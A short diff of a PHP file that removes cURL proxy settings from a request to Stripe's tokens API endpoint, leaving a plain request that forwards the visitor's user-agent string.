@@ -1,8 +1,6 @@
 <?php
 
-$ch = curl_init(''.$ciurl.'');
-curl_setopt($ch, CURLOPT_PROXY, ''.$cproxy.'');
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, ''.$cpp.'');
+$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
